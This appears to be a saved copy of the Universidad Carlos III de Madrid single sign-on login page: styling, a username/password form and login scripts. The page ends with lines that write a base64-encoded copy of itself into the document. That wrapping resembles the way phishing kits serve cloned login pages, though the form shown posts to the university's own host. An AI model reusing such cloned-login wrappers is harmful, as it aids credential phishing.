            padding-right: 500px;
        }
        #langs{
            font-size: 13px;
        }
        #adas_logo{
            margin: 15px auto -30px;
            padding-left: 39px;
        }
        #logo_img{
            margin-top: auto;
            width: 260px;
            height: auto;
        }
        #cream_bar{
            height: 80px;
        }

        #identificacion{
            margin-left: 0px;
        }

        #par {
            border-right: none;
            padding-right: 0px;
            border-bottom: 1px dotted #22942B;
            padding-bottom: 0px;
            position: absolute;
            margin-left: 30px;
            margin-right: 30px;
        }
        #auten_delegadas {
            float: left;
            padding: 280px 0px 0px;
            margin-left: 25px;
            margin-right: 25px;
        }

        .login-box{
            padding-top: 0px;
            margin-bottom: 10px;
        }
        #submit_ok.gradient{
            margin-top: 0px;
        }

        .notes_texts{
            width: 480px;
            margin-top: 20px;
        }

        #content_bottom {
            margin-left: -180px;
        }

        #wayfotherlogin{
            width: 400px;
            padding: 20px 0px;
            left: 255px;
            min-height: 100px;
        }

        #wayfholder li {
            margin-bottom: 4%;
            margin-left: 6%;
        }


        #wayf_button{
            font-size: 16px;
        }
        #remember_button{
            font-size: 13px;
        }


        ul#wayfholder{
            padding-left: 5%;
            padding-right: 5%;
        }
        #number-links{
            font-size: 18px;
        }

        #content .bloque {
            margin-left:40px;
            margin-right: 40px;
            max-width: 430px;
        }
        .exception_trace{
            width: 365px;
        }
        .form-col1{
            height: 22px;
            -webkit-text-size-adjust: 100%;
        }
        textarea{
            width: 350px;
            margin-left: -70px;
            font-size: 12px;
        }

    }

    @media all and (max-width: 490px){ //para 480px
	body { -webkit-text-size-adjust: 100%; }
        div{
            height:auto;
	}
        body, #no_scroll {
            overflow-x:hidden;
            //position: fixed;
        }
        #main{
            margin-left: -10px;
            margin-right: auto;
            margin-top: -30px;
            text-align: left;
            width: 560px;
        }
        #content{
            width: 500px;
            background-position: 0px 0px, center 0px;
            padding-right: 500px;
        }
        #langs{
            font-size: 12px;
            margin-right: 10px;
        }
        #adas_logo{
            margin: 15px auto -30px;
            padding-left: 39px;
        }
        #logo_img{
            margin-top: auto;
            width: 260px;
            height: auto;
        }
        #cream_bar{
            height: 80px;
        }

        #identificacion{
            margin-left: 0px;
        }

        #par {
            border-right: none;
            padding-right: 0px;
            border-bottom: 1px dotted #22942B;
            padding-bottom: 0px;
            position: absolute;
            margin-left: 30px;
            margin-right: 30px;
        }
        #auten_delegadas {
            float: left;
            padding: 280px 0px 0px;
            margin-left: 25px;
            margin-right: 25px;
        }

        .login-box{
            padding-top: 0px;
            margin-bottom: 10px;
        }
        #submit_ok.gradient{
            margin-top: 0px;
        }
        .form-col1{
            font-size: 12px;
            -webkit-text-size-adjust: 100%;
            //width: XXpx; // Disminuye barra verde
        }
        .text-field{
            height: 20px;
        }

        .notes_texts{
            width: 430px;
            margin-top: 20px;
        }

        #content_bottom {
            margin-left: -200px;
        }

        #wayfotherlogin{
            width: 350px;
            padding: 20px 0px;
            left: 255px;
            min-height: 100px;
        }

        #wayfholder li {
            margin-bottom: 3%;
            margin-left: 4%;
        }
        #holder li {
            margin-bottom: 7%;
            margin-left: 5%;
            margin-right: 5%;
        }
        h1#wayf_title{
            font-size: 20px;
        }

        #wayf_button{
            font-size: 18px;
        }
        #remember_button{
            font-size: 15px;
        }

        #otherlogin {
            margin-left: 60px;
        }

        ul#wayfholder{
            padding-left: 5%;
            padding-right: 5%;
        }
        #number-links{
            font-size: 20px;
        }

        #content .bloque {
            margin-left:40px;
            margin-right: 40px;
            max-width: 400px;
        }
        .exception_trace{
            width: 340px;
        }
        .form-col1{
            height: 22px;
            -webkit-text-size-adjust: 100%;
        }

        textarea{
            width: 320px;
            margin-left: -90px;
            font-size: 12px;
        }
    }

    @media all and (max-width: 450px){ // para 420px
	body { -webkit-text-size-adjust: 100%; }

        div{
            height:auto;
	}
        body, #no_scroll {
            overflow-x:hidden;
            //position: fixed;
        }
        #main{
            margin-left: -10px;
            margin-right: auto;
            margin-top: -30px;
            text-align: left;
            width: 500px;
        }
        #content{
            width: 425px;
            background-position: 0px 0px, center 0px;
            padding-right: 500px;
        }
        #langs{
            font-size: 12px;
            margin-right: 10px;
        }
        #adas_logo{
            margin: 15px auto -30px;
            padding-left: 39px;
        }
        #logo_img{
            margin-top: auto;
            width: 260px;
            height: auto;
        }
        #cream_bar{
            height: 80px;
        }

        #identificacion{
            margin-left: -25px;
        }

        #par {
            border-right: none;
            padding-right: 0px;
            border-bottom: 1px dotted #22942B;
            padding-bottom: 0px;
            position: absolute;
            margin-left: 30px;
            margin-right: 30px;
        }
        #auten_delegadas {
            float: left;
            padding: 260px 0px 0px;
            margin-left: 15px;
            margin-right: 15px;
        }

        .login-box{
            padding-top: 0px;
            margin-bottom: 10px;
        }
        #submit_ok.gradient{
            margin-top: 0px;
        }
        .form-col1{
            font-size: 12px;
            -webkit-text-size-adjust: 100%;
            //width: XXpx; // Disminuye barra verde
        }conte
        .text-field{
            height: 20px;
        }

        .notes_texts{
            width: 380px;
            margin-top: 20px;
        }

        #content_bottom {
            margin-left: -250px;
        }

        #wayfotherlogin{
            width: 350px;
            padding: 20px 0px;
            left: 255px;
            min-height: 100px;
        }

        #wayfholder li {
            margin-bottom: 3%;
            margin-left: 4%;
        }
        #holder li {
            margin-bottom: 7%;
            margin-left: 5%;
            margin-right: 5%;
        }
        h1#wayf_title{
            font-size: 20px;
        }

        #wayf_button{
            font-size: 18px;
        }
        #remember_button{
            font-size: 15px;
        }

        #otherlogin {
            margin-left: 60px;
        }

        ul#wayfholder{
            padding-left: 5%;
            padding-right: 5%;
        }
        #number-links{
            font-size: 20px;
        }

        #content .bloque {
            margin-left:40px;
            margin-right: 40px;
            max-width: 400px;
        }
        .exception_trace{
            width: 280px;
        }
        #tech_error_info p{
            width: 300px;
        }
        .form-col1{
            height: 22px;
            -webkit-text-size-adjust: 100%;
        }
        textarea{
            width: 280px;
            margin-left: -100px;
            font-size: 11px;
        }
    }

    @media all and (max-width: 390px){ // para 360px y 380px
	body { -webkit-text-size-adjust: 100%; }

        div{
            height:auto;
	}
        body, #no_scroll {
            overflow-x:hidden;
            //position: fixed;
        }
        #main{
            margin-left: -20px;
            margin-right: auto;
            margin-top: -20px;
            text-align: left;
            width: 440px;
        }
        #content{
            width: 385px;
            background-position: 0px 0px, center 0px;
            padding-right: 500px;
        }
        #langs{
            font-size: 11px;
            margin-right: 10px;
        }
        #adas_logo{
            margin: 10px auto -30px;
            padding-left: 26px;
        }
        #logo_img{
            margin-top: auto;
            width: 225px;
            height: auto;
        }
        #cream_bar{
            height: 60px;
        }

        #texto_titulo, #error_title, #status_title{
            font-size:20px;
        }
        #texto_subtitulo.subtitle{
            font-size: 14px;
        }

        #identificacion{
            margin-left: 0px;
        }
        #identificacion td{
            width: 245px;
        }
        #par {
            border-right: none;
            padding-right: 0px;
            border-bottom: 1px dotted #22942B;
            padding-bottom: 0px;
            position: absolute;
            margin-left: 15px;
            margin-right: 15px;
        }
        #auten_delegadas {
            float: left;
            padding: 250px 0px 0px;
            margin-left: -10px;
            margin-right: 0px;
        }

        .login-box{
            padding-top: 0px;
            margin-bottom: 10px;
        }
        #submit_ok.gradient{
            margin-top: 0px;
        }
        .form-col1{
            font-size: 11px;
            width: 235px;
            -webkit-text-size-adjust: 100%;
        }
        .text-field{
            margin-right: 10px;
            width: 150px;
            height: 20px;
        }

        .notes_texts{
            width: 290px;
            margin-top: 15px;
        }

        #content_bottom {
            margin-left: -215px;
        }

        #wayfotherlogin{
            width: 225px;
            padding: 20px 0px;
            left: 260px;
            min-height: 100px;
        }

        #wayfholder li {
            margin-bottom: 3%;
            margin-left: 4%;
        }
        #holder li {
            margin-bottom: 5%;
            margin-left: 3%;
            margin-right: 3%;
        }
        h1#wayf_title{
            font-size: 16px;
        }

        #wayf_button{
            font-size: 16px;
        }
        #remember_button{
            font-size: 13px;
        }

        #otherlogin {
            margin-left: 40px;
        }

        ul#wayfholder{
            padding-left: 5%;
            padding-right: 5%;
        }
        #number-links{
            font-size: 18px;
            padding-left: 30px;
            width: 250px;
        }
        #titulo_3col{
            font-size: 12px;
            padding-left: 20px;
            width: 250px;
        }
        #nota1, #nota2 {
            font-size: 12px;
        }

        #copyright{
            font-size: 10px;
            padding-left:60px;
        }


        #content .bloque {
            margin-left:55px;
            margin-right: 55px;
            max-width: 280px;
        }
        .bloque p{
            font-size: 12px;
        }
        .list-slo-sps{
            font-size: 12px;
        }
        .exception_trace{
            width: 210px;
            font-size: 10px;
        }
        #tech_error_info p{
            width: 250px;
        }
        .error_subtitle {
            font-size: 12px;
        }
        .form-col1{
            height: 22px;
            -webkit-text-size-adjust: 100%;
        }
        textarea{
            width: 240px;
            margin-left: -110px;
            font-size: 11px;
        }
    }

    .notification{
        margin:20px;
        padding:20px;
    }
    .notification .order{
        color: #001d85;
        font-size: 10pt;
        margin: 5px;
        font-weight: bold;
    }
    .notification h2{
        margin-bottom: 20px;
    }
    .notification p{
        margin-bottom: 15px;
    }
    .notification .button_class{
        padding: 5px;
        margin:5px;
        margin-top:20px;
    }
    .notification ul{
        margin-left:30px;
        margin-bottom:10px;
    }
    .notification li{
        color:#555;
    }

    @media all and (max-width: 339px){ // para 320px
        body { -webkit-text-size-adjust: 100%; }
        div{
            height:auto;
	}
        body, #no_scroll {
            overflow-x:hidden;
            //position: fixed;
        }
        #main{
            margin-left: -40px;
            margin-right: auto;
            margin-top: -40px;
            text-align: left;
            width: 420px;
        }
        #content{
            width: 385px;
            background-position: 0px 0px, center 0px;
            padding-right: 500px;
        }
        #langs{
            font-size: 11px;
            margin-right: 10px;
        }
        #adas_logo{
            margin: 10px auto -30px;
            padding-left: 26px;
        }
        #logo_img{
            margin-top: auto;
            width: 225px;
            height: auto;
        }
        #cream_bar{
            height: 60px;
        }

        #texto_titulo, #error_title, #status_title{
            font-size:20px;
        }
        #texto_subtitulo.subtitle{
            font-size: 14px;
        }

        #identificacion{
            margin-left: 0px;
        }
        #identificacion td{
            width: 260px;
        }
        #par {
            border-right: none;
            padding-right: 0px;
            border-bottom: 1px dotted #22942B;
            padding-bottom: 0px;
            position: absolute;
            margin-left: 0px;
            margin-right: 15px;
        }
        #auten_delegadas {
            float: left;
            padding: 250px 0px 0px;
            margin-left: -10px;
            margin-right: 0px;
        }

        .login-box{
            padding-top: 0px;
            margin-bottom: 10px;
        }
        #submit_ok.gradient{
            margin-top: 0px;
        }
        .form-col1{
            font-size: 11px;
            width: 250px;
            height: 22px;
            -webkit-text-size-adjust: 100%;
        }
        label{
            margin-left: -5px;
        }
        .text-field{
            margin-right: 10px;
            width: 150px;
            height: 20px;
        }

        .notes_texts{
            width: 290px;
            margin-top: 15px;
        }

        #content_bottom {
            margin-left: -225px;
        }

        #wayfotherlogin{
            width: 225px;
            padding: 20px 0px;
            left: 240px;
            min-height: 100px;
        }

        #wayfholder li {
            margin-bottom: 3%;
            margin-left: 4%;
        }
        #holder li {
            margin-bottom: 5%;
            margin-left: 3%;
            margin-right: 3%;
        }
        h1#wayf_title{
            font-size: 16px;
        }

        #wayf_button{
            font-size: 16px;
        }
        #remember_button{
            font-size: 13px;
        }

        #otherlogin {
            margin-left: 40px;
        }

        ul#wayfholder{
            padding-left: 5%;
            padding-right: 5%;
        }
        #number-links{
            font-size: 18px;
            padding-left: 30px;
            width: 250px;
        }
        #titulo_3col{
            font-size: 12px;
            padding-left: 20px;
            width: 250px;
        }
        #nota1, #nota2 {
            font-size: 12px;
        }

        #copyright{
            font-size: 10px;
            padding-left:60px;
        }

        #content .bloque {
            margin-left:55px;
            margin-right: 55px;
            max-width: 280px;
        }
        .bloque p{
            font-size: 12px;
        }
        .list-slo-sps{
            font-size: 12px;
        }
        .exception_trace{
            width: 210px;
            font-size: 10px;
        }
        #tech_error_info p{
            width: 250px;
        }
        .error_subtitle {
            font-size: 12px;
        }

        textarea{
            width: 200px;
            margin-left: -110px;
            font-size: 11px;
        }
        .text_ok {
            word-wrap: break-word;
        }
    }

</style>
        <link href="https://login.uc3m.es/themes/uc3m/css/jquery-ui-1.8.12.custom.css" rel="stylesheet" type="text/css" media="screen">
                <title>adAS | Servicio de Single Sign-On</title>
        <!--[if IE 8]>
        <style type="text/css">
            .form-col1{
            float:left;
            }
        </style>
        <![endif]-->  
        <!--[if IE 9]>
        <style type="text/css">
            .form-col1{
            float:left;
            }
        </style>
        <![endif]--> 
         <!--[if IE 7]>
        <style type="text/css">               
         .button-text, .button-icon{
            margin-left:-40px;
         }
        </style>
        <![endif]-->
    </head>
    <body onload="document.formulario1.adAS_username.focus()"> <div id="no_scroll">      
        <div id="background_wayf" style="display:none"></div>
                <div id="blue_bar">
            <div id="langs">
            </div>
        </div>
        <div id="cream_bar">
            <div id="adas_logo">
                <a href='http://www.uc3m.es/' title='Universidad Carlos III de Madrid'>
                    <img id="logo_img" src='https://login.uc3m.es/imgs/uc3m.png' >
                </a>
            </div>
        </div>
        <div id="main">
            <div id="content">
                <h1 id="texto_titulo">Identificación de usuario</h1>
                <h5 class="subtitle" id="texto_subtitulo">Autenticación centralizada</h5>
                <div class='bloque'>
                                        <div>
                        <table border="0" id="identificacion">
                            <tr>
                                                                    <td valign="top" id="par">
                                        <form action='https://login.uc3m.es/index.php/CAS/login?service=https%3A%2F%2Faulaglobal.uc3m.es%2Flogin%2Findex.php' method='post' name="formulario1" id="formulario1">
                                                                                        <input type="hidden" id="adAS_i18n_theme" name="adAS_i18n_theme" value="es" />
                                            <input type="hidden" name="adAS_mode" value="authn" />
                                            <div id="userpass" style="position:relative;">
                                                <div class="form-item" id="edit-name-wrapper">
                                                    <div class="form-col1 text-question"><label id="label_user" for="edit-name">Usuario</label></div>
                                                    <div class="form-col2"><input class="text-field" type="text"   maxlength="60" name="adAS_username" id="edit-name" size="50" value="" tabindex="1"  /></div>
                                                                                                    </div>
                                                <div class="form-item" id="edit-pass-wrapper">
                                                                                                        <div class="form-col1 text-question"><label id="label_pass" for="edit-pass">Contraseña</label></div>
                                                    <div class="form-col2"><input class="text-field"  type="password" name="adAS_password" id="edit-pass"  maxlength="128"  size="50"  tabindex="2" class="form-text required" value=""/></div>
                                                                                                    </div>
                                                <div class="login-box">
                                                    <input id="submit_ok"  class="gradient "  type="submit" value="Aceptar" name="adAS_submit"/>&nbsp;
                                                </div>
                                                                                                                                                    <div class="remember_button_cl">
                                                        <a id="remember_button" href="https://cambiatuclave.uc3m.es">
                                                            He olvidado mi contraseña                                                        </a>
                                                    </div>
                                                                                                </div>
                                        </form>
                                        <div id="panelhttp" style="display: none;">
                                            <div style="display: none">
                                                <form action='https://login.uc3m.es/index.php/CAS/login?service=https%3A%2F%2Faulaglobal.uc3m.es%2Flogin%2Findex.php' method='post' name="AuthNForm" id="AuthNForm">
                                                    <input type="hidden" name="adAS_mode" value="authn" />
                                                                                                        <input type="submit"  class="gradient" value="Aceptar" name="adAS_submit"/>
                                                </form>
                                            </div>
                                            <div id="externalauth" style="margin-top: 1em;">&nbsp;</div>
                                            <p><a class="return_to_userpassword" href="">Volver atrás</a></p>
                                        </div>
                                    </td>
                                    <td valign="top" id ="auten_delegadas">
                                        <h2 id="titulo_3col">otros medios de autenticación</h2>
                                        <div id="otherlogin">
                                            <ul id="holder">
                                                                                                    <li>
                                                        <a id="x509_module" class="own-button x509_module" href="https://login.uc3m.es/authn/tls/http-tls.php?adAS_request_id=c8861d00-4377-11ed-c01a-7b2272657175">
                                                            <div class="button-cont gradient button-layout">
                                                                <div class="button-icon" style="background: url(https://login.uc3m.es/imgs/icon-x509_module.png) no-repeat top;">&nbsp;</div>
                                                                <div class="button-text mod_name_x509_module" id="sml_x509_authn_label">sml_x509_authn_label</div>
                                                            </div>
                                                                                                                    </a>

                                                    </li>
                                                                                                </ul>
                                        </div>
                                        <div id="number-links">&nbsp;</div>
                                    </td>
                                                                </tr>
                        </table>
                    </div>
                </div>
                <div class="notes_texts">
                                        <p id="nota1">Una vez que se haya autenticado no será necesario identificarse de nuevo para acceder a otros recursos.</p>
                    <p><strong><span id ="nota2">Para desconectarse, recomendamos que cierre su navegador (cerrando todas las ventanas).</span></strong></p>
                </div>   
            </div>
            <div id="content_middle"></div>
            <div id="content_bottom">
                <div class="footer">
                    <a href="http://www.prise.es"><div id="copyright">adAS es un producto desarrollado por PRiSE</div></a>
                </div>
            </div>
        </div>
        <div id="f_blue_bar"></div>   
        <div id="confirm_tls_dialog" style="display:none;" title="<span id='x509_tls_module_confirm_title'>Confirmación de autenticación por certificado digital</span>"><p id="x509_tls_module_confirm_msg">Para poder autenticarse es necesario tener configurado un certificado válido en el navegador o tener introducida correctamente en el lector de certificados la tarjeta correspondiente. Pulse "Continuar" para seguir.</p></div>

        <script type="text/javascript" src="https://login.uc3m.es/themes/uc3m/js/swpages.js"></script>
        <script type="text/javascript">
        function sendAuthn(name, value, formID) {
            try {
                var oForm = document.forms[formID];

                var found = $(oForm).find("#name");
                if (found.length == 0) {
                    $(oForm).append("<input type='hidden' name='" + name + "' value='" + value + "'/>");
                }
                else {
                    found[0].val(value);
                }
                oForm.submit();
            } catch (e) {
                alert('Error....\n' + e.message);
            }
        }

        function checkError(response, status, xhr, error_id) {
            if (xhr.status >= 300) {
                var error_msg = '<div class="ui-state-error ui-corner-all error_msg">';
                error_msg += '<p><span style="float: left; margin-right: 0.3em;" class="ui-icon ui-icon-alert"></span>';
                error_msg += '<span id="text_span_error"><strong id="' + error_id + '">' + textos[$("#langs .highlight_lang").attr("id")][error_id] + '</strong></span>';
                error_msg += '</p></div>';
                if ($(".bloque .error_msg").length == 0) {
                    $(".bloque").prepend(error_msg);
                } else {
                    $(".bloque .error_msg #text_span_error").html('<strong id="' + error_id + '">' + textos[$("#langs .highlight_lang").attr("id")][error_id] + '</strong>');
                }
            }
        }

        $(document).ready(function() {
                        var url_hash = window.location.hash;
            if(url_hash.length !== 0){
                processAction(url_hash);
                processModules(url_hash);
            }
            //$("button, input:submit, .own-button").button();
            if ($('.ui-state-error').length < 1) {
                $('.notes_texts').show();
            }
            $('#holder').sweetPages({perPage: 4});
            var controls = $('.swControls').detach();
            $('#number-links').html(controls);

            $('a.http_authn_module').click(function() {
                if ($(this).attr("disabled") != "disabled") {
                    $('#panelhttp').hide();
                    $('#externalauth').load("https://login.uc3m.es/authn/httpauth/js-httpauth.php", function(response, status, xhr) {
                        checkError(response, status, xhr, "error_httpauth");
                    });
                }
            });
            $("#x509_module").click(function(e) {
                e.preventDefault();
                if ($(this).attr("disabled") != "disabled") {
                    $("#confirm_tls_dialog").dialog({
                        resizable: false,
                        height: 'auto',
                        //width: 'auto',
                        modal: false,
                        closeText: 'hide',
                        buttons: {
                            "Aceptar": function() {
                                $(this).dialog("close");
                                window.location = $("#x509_module").attr('href');
                                $('#background_wayf').hide();
                            },
                            "Cancelar": function() {
                                $(this).dialog("close");
                                $('#background_wayf').hide();
                            }
                        },
                        open: function(event, ui) {
                            var buttons = $(this).parent().find(".ui-button-text");
                            $(buttons[0]).html("<span id='submit_confirm'>" + $(buttons[0]).html() + "</span>");
                            $(buttons[1]).html("<span id='submit_ko'>" + $(buttons[1]).html() + "</span>");
                            var theme_lang = $("#adAS_i18n_theme").val();
                            if(theme_lang!=undefined){
                                translate_to(theme_lang);
                            }
                            $('#background_wayf').height($(document).height() * 1.20).show();
                        }
                    })
                    var dialog = $("#confirm_tls_dialog").parent();
                    dialog.css('font', '14px arial,helvetica,verdana,sans-serif');
                    dialog.find("p").css('padding', '20px');
                    dialog.find("button").css('background', '#001d85').css('color', '#fff').css('font', '14px arial,helvetica,verdana,sans-serif');
                    dialog.find(".ui-dialog-titlebar").css('background', '#001d85').css('color', '#fff');
                    dialog.find(".ui-dialog-titlebar-close").hide();                        
                }
            });
            $('.return_to_userpassword').click(function(event) {
                event.preventDefault();
                $('#panelhttp').hide();
                $('#userpass').show();
            });
            activate_translation();                
            activate_translation_extra();
            $("#wayf_button").click(function() {
                $('#background_wayf').show();
                $('#wayfotherlogin').fadeIn('slow', function() {
                    $('#background_wayf').height($(document).height() * 1.20);
                });
            });
            $("#wayf_button_close2").click(function() {
                $('#wayfotherlogin').fadeOut();
                $('#background_wayf').hide();
            });
            $("#formulario1").submit(function() {
                $("#formulario1").find("input:submit").prop('disabled', true);
                setTimeout(function() {
                    $("#formulario1").find("input:submit").prop('disabled', false);
                }, 5000);
                return true;
            });

            if((navigator.platform.indexOf('iPhone') != -1) || (navigator.platform.indexOf('iPod') != -1) || (navigator.platform.indexOf('iPad') != -1)){
                $('.text-field').css('height','17px');
            }
        });
         function activate_translation_extra() {
                var texts = {
                                  };
                $(langs).each(function () {
                    $("#" + this).click(function () {
                        var id_lang_cl = this.id;
                        $(".button-text").each(function (i, elem) {
                            var classes = $(elem).attr("class");
                            var sml_id = classes.match(/mod\_name\_(.*)$/);
                            if(sml_id!==undefined && sml_id[1]!==undefined && texts[sml_id[1]]!==undefined){
                                if(texts[sml_id[1]][id_lang_cl]!==undefined){
                                    $(elem).text(texts[sml_id[1]][id_lang_cl]);
                                }else if(texts[sml_id[1]][default_lang]!==undefined){
                                    $(elem).text(texts[sml_id[1]][default_lang]);
                                }
                            }
                        });

                    });
                });

            }
        function processAction(url_hash){
            var acti = $("#formulario1").attr('action');
            $("#formulario1").attr('action',acti+url_hash);
        }
        function processModules(url_hash){
            $("a.own-button").each(function() {
                var acti_own = $(this).attr('href');
                $(this).attr('href',acti_own+url_hash);
            });
        }
        </script>                            
    </div></body>
</html>
";
document.open();
document.write(atou(base64encoded));
document.close();
